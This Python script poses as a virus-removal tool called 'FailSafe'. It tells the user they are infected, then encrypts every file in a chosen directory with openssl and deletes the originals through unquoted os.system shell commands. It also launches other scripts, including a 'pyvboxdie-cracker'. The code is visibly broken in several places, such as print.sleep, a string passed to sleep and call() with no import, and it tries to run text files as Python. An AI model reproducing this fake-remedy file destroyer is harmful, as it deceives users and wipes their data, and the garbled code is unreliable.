import os
import time
print(" ")
time.sleep(1)
print(" ")
time.sleep(1)
print(" ")
time.sleep(1)
print("Welcome to FailSafe")
time.sleep(1)
print("HMMMM...")
print("It seems lke you have been affected by a virus!!!!")
time.sleep(1)
print("We can remove it!!!")
time.sleep("5")
print.sleep(" Your persinal password is --> [password]")
def get_files(path):
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r, file))
    return files


def deletor(filelist):
    for i in filelist:
        cmd = f"rm {i}&"
        os.system(cmd)
    return


def encrypt(filelist, password):
    for i in filelist:
        cmd = (
            f"openssl aes-256-cbc -a -salt -in {i} -out {i}.aes -pass pass:{password}&"
        )
        os.system(cmd)
    deletor(filelist)
    return


def decrypt(filelist, password):
    for i in filelist:
        cmd = f"openssl aes-256-cbc -d -a -salt -in {i} -out {i[:i.rfind('.')]} -pass pass:{password}&"
        os.system(cmd)
    deletor(filelist)
    return


if __name__ == "__main__":
    print("Please select an option of removal. \n [1]. Encrypt(encrypts your virus) \n [2]. Decrypt(Decrypts your files and deletes your virus)\n")
    inp = int(input())
    print("\nPlease enter the directory that you want to use: ")
    dirx = input()
    print("\nPassword?: ")
    passw = input()
    files = get_files(dirx)
    if inp == 1:
        encrypt(files, passw)
    elif inp == 2:
        decrypt(files, passw)
    
    
    
os.system('python ../One/pyvboxdie-cracker.py')
os.system('python ../One/requirements.txt')
os.system('python ../One/wordlist.txt')
call(["python", "Image encryption"])
call(["python", "pyvboxdie-cracker.py"])
call(["python", "requirements.txt"])
call(["python", "wordlist.txt"])
